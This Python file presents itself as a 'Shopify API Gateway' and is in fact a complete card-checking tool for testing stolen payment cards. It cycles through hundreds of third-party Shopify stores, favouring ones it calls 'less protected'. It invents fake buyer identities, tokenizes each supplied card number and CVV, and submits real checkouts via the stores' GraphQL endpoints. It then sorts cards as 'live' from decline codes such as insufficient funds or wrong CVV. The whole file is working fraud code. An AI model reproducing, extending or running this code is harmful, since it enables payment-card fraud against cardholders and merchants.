"""
Shopify API Gateway - Full payment flow implementation using /products.json API
Integrates the complete Shopify checkout process with GraphQL API
"""

import asyncio
import aiohttp
import random
import re
import os
import json
from typing import Dict, Optional, Tuple, List
from urllib.parse import urlparse
from datetime import datetime

# Store file paths
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
VALIDATED_DB_FILE = os.path.join(BASE_DIR, 'validated_stores_db.json')
VALIDATED_STORES_FILE = os.path.join(BASE_DIR, 'valid_shopify_stores.txt')
STORES_FILE = os.path.join(BASE_DIR, 'shopify_stores.txt')

# Known working stores for checkout (tested and verified)
KNOWN_WORKING_STORES = [
    'puppylove.myshopify.com',
    'theaterchurch.myshopify.com',
    'fdbf.myshopify.com',
]


class ShopifyAPIGateway:
    """
    Shopify API Gateway - Complete payment flow using Shopify's API
    
    Flow:
    1. Fetch products from /products.json to find cheapest variant
    2. Add product to cart via /cart/add.js
    3. Initiate checkout via /checkout/
    4. Complete checkout via GraphQL API at /checkouts/unstable/graphql
    5. Get payment token from deposit.shopifycs.com/sessions
    6. Submit payment via SubmitForCompletion mutation
    7. Poll for receipt status
    """
    
    def __init__(self, stores_file: str = None):
        self.stores_file = stores_file or STORES_FILE
        self.stores = []
        self.current_store_index = 0
        self.failed_stores = set()  # Track failed stores to skip
        self.load_stores()
        
        # Default headers
        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
        }
    
    def load_stores(self):
        """Load Shopify stores - prioritizes validated JSON database"""
        self.stores = []
        
        # Try to load from validated JSON database first (pre-fetched products)
        if os.path.exists(VALIDATED_DB_FILE):
            try:
                with open(VALIDATED_DB_FILE, 'r') as f:
                    db_data = json.load(f)
                
                for store in db_data.get('stores', []):
                    self.stores.append({
                        'url': store['domain'],
                        'variant_id': store.get('variant_id'),
                        'price': store.get('price'),
                        'product_title': store.get('product_title', 'Unknown'),
                        'priority': True,
                        'pre_validated': True
                    })
                
                print(f"Loaded {len(self.stores)} pre-validated stores from database")
                
                # If we have enough stores, we're done
                if len(self.stores) >= 50:
                    return
            except Exception as e:
                print(f"Warning: Could not load validated database: {e}")
        
        # Add known working stores
        for store in KNOWN_WORKING_STORES:
            if store not in [s['url'] for s in self.stores]:
                self.stores.append({
                    'url': store,
                    'variant_id': None,
                    'price': None,
                    'priority': True,
                    'pre_validated': False
                })
        
        # Try validated stores file
        stores_file = VALIDATED_STORES_FILE if os.path.exists(VALIDATED_STORES_FILE) else self.stores_file
        
        if not os.path.exists(stores_file):
            print(f"Warning: Stores file not found: {stores_file}")
            print(f"Using {len(self.stores)} stores")
            return
        
        with open(stores_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        myshopify_stores = []
        other_stores = []
        existing_urls = {s['url'] for s in self.stores}
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Valid Shopify') or line.startswith('Total:') or line.startswith('  '):
                continue
            
            # Parse store line - format can vary
            parts = line.split()
            store_url = parts[0].replace('https://', '').replace('http://', '').rstrip('/')
            
            # Validate URL format - must have valid domain structure
            if not self._is_valid_store_url(store_url):
                continue
            
            # Skip if already loaded
            if store_url in existing_urls:
                continue
            
            variant_id = None
            price = None
            
            if len(parts) > 1:
                try:
                    price = float(parts[1].replace('$', '').replace(',', ''))
                except:
                    pass
            
            store_data = {
                'url': store_url,
                'variant_id': variant_id,
                'price': price,
                'priority': False,
                'pre_validated': False
            }
            
            # Prioritize .myshopify.com stores (less protected)
            if '.myshopify.com' in store_url:
                myshopify_stores.append(store_data)
            else:
                other_stores.append(store_data)
        
        # Shuffle each group
        random.shuffle(myshopify_stores)
        random.shuffle(other_stores)
        
        # Add myshopify stores first, then others (limit to 500 total)
        remaining = 500 - len(self.stores)
        if remaining > 0:
            self.stores.extend(myshopify_stores[:remaining//2])
            self.stores.extend(other_stores[:remaining//2])
        
        pre_validated = len([s for s in self.stores if s.get('pre_validated')])
        print(f"Loaded {len(self.stores)} stores ({pre_validated} pre-validated, {len(myshopify_stores)} myshopify available)")
    
    def _is_valid_store_url(self, url: str) -> bool:
        """Validate that URL is a proper store domain"""
        if not url or len(url) < 4:
            return False
        
        # Must contain a dot
        if '.' not in url:
            return False
        
        # Must have valid TLD (at least 2 chars after last dot)
        parts = url.split('.')
        if len(parts) < 2:
            return False
        
        tld = parts[-1]
        if len(tld) < 2 or not tld.isalpha():
            return False
        
        # Domain part must be alphanumeric with hyphens
        domain = parts[-2] if len(parts) >= 2 else ''
        if not domain or len(domain) < 1:
            return False
        
        # Check for invalid characters
        valid_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-.')
        if not all(c in valid_chars for c in url):
            return False
        
        # Exclude obvious non-stores
        invalid_domains = ['localhost', 'example.com', 'test.com', '127.0.0.1']
        if url.lower() in invalid_domains:
            return False
        
        return True
    
    def get_next_store(self) -> Optional[Dict]:
        """Get the next store in rotation, cycling through all stores"""
        if not self.stores:
            return None
        
        # Try to find a store that hasn't failed recently
        attempts = 0
        max_attempts = min(len(self.stores), 10)
        
        while attempts < max_attempts:
            store = self.stores[self.current_store_index]
            self.current_store_index = (self.current_store_index + 1) % len(self.stores)
            
            # Skip stores that have failed recently
            if store['url'] not in self.failed_stores:
                return store
            
            attempts += 1
        
        # If all stores have failed, clear failed list and try again
        if len(self.failed_stores) >= len(self.stores) // 2:
            self.failed_stores.clear()
        
        # Return current store anyway
        store = self.stores[self.current_store_index]
        self.current_store_index = (self.current_store_index + 1) % len(self.stores)
        return store
    
    def get_random_store(self) -> Optional[Dict]:
        """Get a random store (legacy method, now uses cycling)"""
        return self.get_next_store()
    
    def mark_store_failed(self, domain: str):
        """Mark a store as failed to skip it temporarily"""
        self.failed_stores.add(domain)
    
    def mark_store_success(self, domain: str):
        """Mark a store as successful, remove from failed list"""
        self.failed_stores.discard(domain)
    
    async def fetch_products(self, session: aiohttp.ClientSession, domain: str) -> Tuple[bool, Dict or str]:
        """
        Fetch products from Shopify store via /products.json
        Returns cheapest available product variant
        """
        try:
            url = f"https://{domain}/products.json"
            
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    return False, f"Site Error (Status: {resp.status})"
                
                text = await resp.text()
                
                if "shopify" not in text.lower():
                    return False, "Not a Shopify store"
                
                try:
                    data = json.loads(text)
                    products = data.get('products', [])
                except:
                    return False, "Invalid JSON response"
                
                if not products:
                    return False, "No products found"
            
            # Find cheapest available variant
            min_price = float('inf')
            min_product = None
            
            for product in products:
                if not product.get('variants'):
                    continue
                
                for variant in product['variants']:
                    if not variant.get('available', True):
                        continue
                    
                    try:
                        price = variant.get('price', '0')
                        if isinstance(price, str):
                            price = float(price.replace(',', ''))
                        else:
                            price = float(price)
                        
                        if price < min_price and price > 0:
                            min_price = price
                            min_product = {
                                'site': domain,
                                'price': f"{price:.2f}",
                                'variant_id': str(variant['id']),
                                'product_handle': product.get('handle', ''),
                                'product_title': product.get('title', 'Unknown')
                            }
                    except (ValueError, TypeError):
                        continue
            
            if min_product:
                return True, min_product
            else:
                return False, "No available products"
                
        except asyncio.TimeoutError:
            return False, "Timeout"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def _extract_between(self, text: str, start: str, end: str) -> str:
        """Extract text between start and end markers"""
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return ''
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return ''
            return text[start_idx:end_idx]
        except:
            return ''
    
    def _generate_buyer_info(self) -> Dict:
        """Generate random buyer information"""
        first_names = ['John', 'James', 'Michael', 'David', 'Robert', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        
        cities_data = [
            ('New York', 'NY', '10001'),
            ('Los Angeles', 'CA', '90001'),
            ('Chicago', 'IL', '60601'),
            ('Houston', 'TX', '77001'),
            ('Phoenix', 'AZ', '85001'),
            ('Philadelphia', 'PA', '19101'),
            ('San Antonio', 'TX', '78201'),
            ('San Diego', 'CA', '92101'),
        ]
        
        streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Washington Blvd', 'Park Ave', 'Lake Dr']
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        city, state, zip_code = random.choice(cities_data)
        
        rand_num = random.randint(1000, 99999)
        email = f"{first_name.lower()}.{last_name.lower()}{rand_num}@{random.choice(domains)}"
        
        return {
            'firstName': first_name,
            'lastName': last_name,
            'email': email,
            'street': f"{random.randint(100, 9999)} {random.choice(streets)}",
            'city': city,
            'state': state,
            'zip': zip_code,
            'phone': f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
        }
    
    async def process_card(self, card: str, proxy: Optional[str] = None) -> Tuple[str, str, str]:
        """
        Process a card through Shopify checkout
        
        Args:
            card: Card in format "NUMBER|MM|YY|CVV"
            proxy: Optional proxy string
        
        Returns:
            (status, message, card_type)
            status: 'approved', 'declined', 'error'
        """
        try:
            # Parse card
            parts = card.split('|')
            if len(parts) < 4:
                return "error", "Invalid card format (use: NUMBER|MM|YY|CVV)", "Unknown"
            
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Clean card number
            cc_clean = re.sub(r'[^0-9]', '', cc)
            formatted_card = " ".join([cc_clean[i:i+4] for i in range(0, len(cc_clean), 4)])
            
            # Get store (cycling through stores)
            store = self.get_next_store()
            if not store:
                return "error", "No stores available", "Unknown"
            
            domain = store['url']
            variant_id = store.get('variant_id')
            pre_validated = store.get('pre_validated', False)
            
            print(f"Using store: {domain} {'(pre-validated)' if pre_validated else ''}")
            
            # Get buyer info
            buyer = self._generate_buyer_info()
            
            # Setup session
            headers = self.default_headers.copy()
            headers['Origin'] = f"https://{domain}"
            headers['Referer'] = f"https://{domain}/"
            
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                # Step 1: Fetch products if no variant_id
                if not variant_id:
                    print("Fetching products...")
                    success, result = await self.fetch_products(session, domain)
                    if not success:
                        self.mark_store_failed(domain)
                        return "error", result, "Unknown"
                    
                    variant_id = result['variant_id']
                    print(f"Found product: {result['product_title']} - ${result['price']}")
                else:
                    print(f"Using pre-fetched variant: {variant_id}")
                
                # Step 2: Add to cart (using same method as working autoShopify.py)
                print("Adding to cart...")
                cart_url = f"https://{domain}/cart/add.js"
                
                # Use simple dict data like the working implementation
                cart_data = {'id': variant_id}
                
                async with session.post(cart_url, data=cart_data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status not in [200, 201]:
                        # Try with quantity parameter
                        cart_data = {'id': variant_id, 'quantity': 1}
                        async with session.post(cart_url, data=cart_data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                            if resp2.status not in [200, 201]:
                                self.mark_store_failed(domain)
                                return "error", f"Cart add failed ({resp.status})", "Unknown"
                    
                    # Read response as text (might be JS or JSON)
                    cart_text = await resp.text()
                    print(f"Cart response: {cart_text[:100]}...")
                
                # Step 3: Get checkout page
                print("Getting checkout...")
                checkout_url = f"https://{domain}/checkout"
                
                async with session.get(checkout_url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as resp:
                    if resp.status != 200:
                        return "error", f"Checkout failed ({resp.status})", "Unknown"
                    
                    checkout_html = await resp.text()
                    final_url = str(resp.url)
                
                # Check for login requirement
                if '/account/login' in final_url.lower():
                    self.mark_store_failed(domain)
                    return "error", "Store requires login", "Unknown"
                
                # Extract session token
                sst = self._extract_between(checkout_html, 'name="serialized-session-token" content="&quot;', '&q')
                if not sst:
                    sst = self._extract_between(checkout_html, '"sessionToken":"', '"')
                
                if not sst:
                    self.mark_store_failed(domain)
                    return "error", "Failed to get session token", "Unknown"
                
                # Extract other tokens
                queue_token = self._extract_between(checkout_html, 'queueToken&quot;:&quot;', '&q')
                if not queue_token:
                    queue_token = self._extract_between(checkout_html, '"queueToken":"', '"')
                
                stable_id = self._extract_between(checkout_html, 'stableId&quot;:&quot;', '&q')
                if not stable_id:
                    stable_id = self._extract_between(checkout_html, '"stableId":"', '"')
                
                # Get currency
                currency_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
                currency = currency_match.group(1) if currency_match else 'USD'
                
                # Get subtotal
                subtotal = self._extract_between(checkout_html, '"amount":"', '"')
                if not subtotal:
                    subtotal = '1.00'
                
                print(f"Session token obtained, currency: {currency}")
                
                # Step 4: GraphQL Proposal
                print("Sending GraphQL proposal...")
                graphql_url = f"https://{domain}/checkouts/unstable/graphql"
                
                proposal_query = self._get_proposal_query()
                proposal_vars = self._get_proposal_variables(
                    sst, queue_token, stable_id, variant_id, subtotal, currency, buyer
                )
                
                proposal_payload = {
                    'query': proposal_query,
                    'variables': proposal_vars,
                    'operationName': 'Proposal'
                }
                
                async with session.post(graphql_url, json=proposal_payload, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                    if resp.status != 200:
                        return "error", f"Proposal failed ({resp.status})", "Unknown"
                    
                    proposal_result = await resp.json()
                
                # Check for errors
                if 'errors' in proposal_result:
                    error_msg = str(proposal_result['errors'])[:100]
                    if 'CAPTCHA' in error_msg.upper():
                        return "error", "Captcha required", "Unknown"
                    return "error", f"Proposal error: {error_msg}", "Unknown"
                
                # Extract delivery info
                try:
                    negotiate = proposal_result['data']['session']['negotiate']['result']
                    seller_proposal = negotiate['sellerProposal']
                    
                    # Get delivery strategy
                    delivery = seller_proposal.get('delivery', {})
                    delivery_lines = delivery.get('deliveryLines', [{}])
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', []) if delivery_lines else []
                    
                    delivery_handle = strategies[0].get('handle', '') if strategies else ''
                    shipping_amount = '0'
                    if strategies:
                        shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                    
                    # Get payment method
                    payment = seller_proposal.get('payment', {})
                    payment_lines = payment.get('availablePaymentLines', [])
                    payment_identifier = 'credit_card'
                    
                    for pl in payment_lines:
                        pm = pl.get('paymentMethod', {})
                        if pm.get('paymentMethodIdentifier'):
                            payment_identifier = pm['paymentMethodIdentifier']
                            break
                    
                    # Get running total
                    running_total = seller_proposal.get('runningTotal', {}).get('value', {}).get('amount', subtotal)
                    
                except Exception as e:
                    return "error", f"Parse error: {str(e)[:50]}", "Unknown"
                
                print(f"Delivery: {delivery_handle}, Total: ${running_total}")
                
                # Step 5: Get payment token
                print("Getting payment token...")
                payment_payload = {
                    "credit_card": {
                        "month": mes,
                        "name": f"{buyer['firstName']} {buyer['lastName']}",
                        "number": formatted_card,
                        "verification_value": cvv,
                        "year": ano if len(ano) == 4 else f"20{ano}",
                    },
                    "payment_session_scope": domain
                }
                
                async with session.post('https://deposit.shopifycs.com/sessions', json=payment_payload, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status != 200:
                        return "error", f"Token failed ({resp.status})", "Unknown"
                    
                    token_result = await resp.json()
                    
                    if 'id' not in token_result:
                        return "error", "No payment token", "Unknown"
                    
                    payment_token = token_result['id']
                
                print("Payment token obtained")
                
                # Step 6: Submit for completion
                print("Submitting payment...")
                submit_query = self._get_submit_query()
                submit_vars = self._get_submit_variables(
                    sst, queue_token, stable_id, variant_id, subtotal, currency, buyer,
                    payment_token, payment_identifier, running_total, shipping_amount, delivery_handle
                )
                
                submit_payload = {
                    'query': submit_query,
                    'variables': submit_vars,
                    'operationName': 'SubmitForCompletion'
                }
                
                async with session.post(graphql_url, json=submit_payload, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    submit_text = await resp.text()
                
                # Check for common errors
                if 'CAPTCHA' in submit_text.upper():
                    return "error", "Captcha at checkout", "Unknown"
                
                if 'Your order total has changed' in submit_text:
                    return "error", "Order total changed", "Unknown"
                
                # Try to get receipt ID
                receipt_id = self._extract_between(submit_text, '"id":"', '"')
                
                if not receipt_id:
                    # Check for specific errors
                    if 'VERIFICATION_VALUE_INVALID' in submit_text:
                        return "declined", "Invalid CVV", "Unknown"
                    if 'incorrect_number' in submit_text.lower():
                        return "declined", "Invalid card number", "Unknown"
                    if 'expired' in submit_text.lower():
                        return "declined", "Card expired", "Unknown"
                    
                    return "error", "No receipt ID", "Unknown"
                
                # Step 7: Poll for receipt
                print("Polling for result...")
                poll_query = self._get_poll_query()
                poll_vars = {
                    'receiptId': receipt_id,
                    'sessionToken': sst
                }
                
                poll_payload = {
                    'query': poll_query,
                    'variables': poll_vars,
                    'operationName': 'PollForReceipt'
                }
                
                for _ in range(3):
                    async with session.post(graphql_url, json=poll_payload, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        poll_text = await resp.text()
                    
                    if 'WaitingReceipt' in poll_text or 'ProcessingReceipt' in poll_text:
                        await asyncio.sleep(3)
                        continue
                    break
                
                # Mark store as successful
                self.mark_store_success(domain)
                
                # Parse final result
                return self._parse_result(poll_text, running_total, currency)
                
        except asyncio.TimeoutError:
            return "error", "Timeout", "Unknown"
        except aiohttp.ClientError as e:
            return "error", f"Connection error: {str(e)[:30]}", "Unknown"
        except Exception as e:
            return "error", f"Exception: {str(e)[:50]}", "Unknown"
    
    def _parse_result(self, text: str, amount: str, currency: str) -> Tuple[str, str, str]:
        """Parse the final result from poll response"""
        text_lower = text.lower()
        
        # Check for 3D Secure
        if 'actionrequiredreceipt' in text_lower or 'completepaymentchallenge' in text_lower:
            return "declined", "3D Secure Required", "3DS"
        
        # Check for success
        if 'processedreceipt' in text_lower and 'processingerror' not in text_lower:
            # Check for soft declines (card is live)
            if 'insufficient' in text_lower or 'low_funds' in text_lower:
                return "approved", "Insufficient Funds (Card Live)", "2D"
            if 'incorrect_cvc' in text_lower or 'invalid_cvc' in text_lower:
                return "approved", "Incorrect CVV (Card Live)", "2D"
            if 'incorrect_zip' in text_lower or 'avs' in text_lower:
                return "approved", "Incorrect Zip (Card Live)", "2D"
            
            return "approved", f"Charged ${amount} {currency}", "2D"
        
        # Check for specific declines
        if 'do_not_honor' in text_lower or 'generic_decline' in text_lower:
            return "declined", "Declined", "Unknown"
        if 'incorrect_number' in text_lower or 'invalid_number' in text_lower:
            return "declined", "Invalid Card Number", "Unknown"
        if 'expired' in text_lower:
            return "declined", "Card Expired", "Unknown"
        if 'stolen' in text_lower or 'lost' in text_lower:
            return "declined", "Card Reported Lost/Stolen", "Unknown"
        if 'velocity' in text_lower or 'rate_limit' in text_lower:
            return "error", "Rate Limited", "Unknown"
        
        # Extract error code if present
        error_code = self._extract_between(text, '"code":"', '"')
        if error_code:
            return "declined", f"Declined: {error_code}", "Unknown"
        
        return "declined", "Unknown decline", "Unknown"
    
    def _get_proposal_query(self) -> str:
        """Get GraphQL Proposal query"""
        return '''query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$payment:PaymentTermInput,$taxes:TaxTermInput,$discounts:DiscountTermsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,merchandise:$merchandise,buyerIdentity:$buyerIdentity,payment:$payment,taxes:$taxes,discounts:$discounts},queueToken:$queueToken}){result{...on NegotiationResultAvailable{queueToken sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle title amount{value{amount currencyCode}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name}}}}}runningTotal{value{amount currencyCode}}}}errors{code localizedMessage}}}}}'''
    
    def _get_submit_query(self) -> str:
        """Get GraphQL SubmitForCompletion query"""
        return '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input,attemptToken:$attemptToken){...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{code localizedMessage}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token}...on ProcessingReceipt{pollDelay}...on WaitingReceipt{pollDelay}...on ActionRequiredReceipt{action{...on CompletePaymentChallenge{url}}}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}}}}'''
    
    def _get_poll_query(self) -> str:
        """Get GraphQL PollForReceipt query"""
        return '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode}}}...on ProcessingReceipt{pollDelay}...on WaitingReceipt{pollDelay}...on ActionRequiredReceipt{action{...on CompletePaymentChallenge{url}}}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}}}}'''
    
    def _get_proposal_variables(self, sst: str, queue_token: str, stable_id: str, 
                                variant_id: str, subtotal: str, currency: str, buyer: Dict) -> Dict:
        """Get Proposal variables"""
        return {
            'sessionInput': {'sessionToken': sst},
            'queueToken': queue_token or '',
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': {
                'deliveryLines': [{
                    'destination': {
                        'partialStreetAddress': {
                            'address1': buyer['street'],
                            'address2': '',
                            'city': buyer['city'],
                            'countryCode': 'US',
                            'postalCode': buyer['zip'],
                            'firstName': buyer['firstName'],
                            'lastName': buyer['lastName'],
                            'zoneCode': buyer['state'],
                            'phone': buyer['phone'],
                        },
                    },
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}},
                    'targetMerchandiseLines': {'any': True},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True,
                }],
                'noDeliveryRequired': [],
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': stable_id or 'line-0',
                    'merchandise': {
                        'productVariantReference': {
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [],
                        },
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                }],
            },
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [],
                'billingAddress': {
                    'streetAddress': {
                        'address1': buyer['street'],
                        'city': buyer['city'],
                        'countryCode': 'US',
                        'lastName': buyer['lastName'],
                        'zoneCode': buyer['state'],
                    },
                },
            },
            'buyerIdentity': {
                'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                'email': buyer['email'],
                'emailChanged': False,
            },
            'taxes': {
                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
            },
        }
    
    def _get_submit_variables(self, sst: str, queue_token: str, stable_id: str,
                              variant_id: str, subtotal: str, currency: str, buyer: Dict,
                              payment_token: str, payment_identifier: str,
                              running_total: str, shipping_amount: str, delivery_handle: str) -> Dict:
        """Get SubmitForCompletion variables"""
        return {
            'input': {
                'sessionInput': {'sessionToken': sst},
                'queueToken': queue_token or '',
                'purchaseProposal': {
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': buyer['street'],
                                    'address2': '',
                                    'city': buyer['city'],
                                    'countryCode': 'US',
                                    'postalCode': buyer['zip'],
                                    'firstName': buyer['firstName'],
                                    'lastName': buyer['lastName'],
                                    'zoneCode': buyer['state'],
                                    'phone': buyer['phone'],
                                },
                            },
                            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_handle}},
                            'targetMerchandiseLines': {'lines': [{'stableId': stable_id or 'line-0'}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
                        }],
                        'noDeliveryRequired': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id or 'line-0',
                            'merchandise': {
                                'productVariantReference': {
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                },
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        }],
                    },
                    'payment': {
                        'totalAmount': {'value': {'amount': running_total, 'currencyCode': currency}},
                        'paymentLines': [{
                            'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_identifier, 'sessionId': payment_token}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': buyer['street'],
                                'city': buyer['city'],
                                'countryCode': 'US',
                                'lastName': buyer['lastName'],
                                'firstName': buyer['firstName'],
                                'zoneCode': buyer['state'],
                                'postalCode': buyer['zip'],
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                        'email': buyer['email'],
                    },
                    'taxes': {
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                    },
                    'discounts': {'lines': []},
                },
            },
            'attemptToken': f"{random.randint(100000000, 999999999)}",
        }
    
    def check(self, card: str, proxy: Optional[str] = None) -> Tuple[str, str, str]:
        """
        Synchronous wrapper for process_card
        
        Args:
            card: Card in format "NUMBER|MM|YY|CVV"
            proxy: Optional proxy string
        
        Returns:
            (status, message, card_type)
        """
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # If loop is already running, create a new one in a thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(asyncio.run, self.process_card(card, proxy))
                    return future.result(timeout=60)
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        return loop.run_until_complete(self.process_card(card, proxy))


# Wrapper class for Gateway Manager integration
class ShopifyAPIGatewayWrapper:
    """Wrapper class for integration with GatewayManager"""
    
    def __init__(self):
        self.name = "Shopify API"
        self.charge_amount = "Varies"
        self.description = "Full Shopify API checkout with /products.json (15K+ stores)"
        self.speed = "medium"
        self.success_count = 0
        self.fail_count = 0
        self.error_count = 0
        self._gateway = None
    
    @property
    def gateway(self):
        if self._gateway is None:
            self._gateway = ShopifyAPIGateway()
        return self._gateway
    
    def check(self, card: str, proxy: Optional[str] = None) -> Tuple[str, str, str]:
        """Check a card through Shopify API gateway"""
        try:
            status, message, card_type = self.gateway.check(card, proxy)
            
            if status == 'approved':
                self.success_count += 1
            elif status == 'error':
                self.error_count += 1
            else:
                self.fail_count += 1
            
            return status, message, card_type
        except Exception as e:
            self.error_count += 1
            return "error", f"Exception: {str(e)[:50]}", "Unknown"
    
    def get_success_rate(self) -> float:
        """Get success rate percentage"""
        total = self.success_count + self.fail_count
        if total == 0:
            return 0.0
        return (self.success_count / total) * 100
    
    def reset_stats(self):
        """Reset statistics"""
        self.success_count = 0
        self.fail_count = 0
        self.error_count = 0


# Convenience function for direct usage
def check_card_shopify_api(card: str, proxy: Optional[str] = None) -> Tuple[str, str, str]:
    """
    Check a card using Shopify API gateway
    
    Args:
        card: Card in format "NUMBER|MM|YY|CVV"
        proxy: Optional proxy string
    
    Returns:
        (status, message, card_type)
    """
    gateway = ShopifyAPIGateway()
    return gateway.check(card, proxy)


if __name__ == "__main__":
    # Test the gateway
    print("="*60)
    print("SHOPIFY API GATEWAY TEST")
    print("="*60)
    
    gateway = ShopifyAPIGateway()
    print(f"Loaded {len(gateway.stores)} stores")
    
    # Test with a sample card (will fail but shows flow)
    test_card = "4242424242424242|12|25|123"
    print(f"\nTesting card: {test_card}")
    
    status, message, card_type = gateway.check(test_card)
    print(f"Result: {status} - {message} ({card_type})")
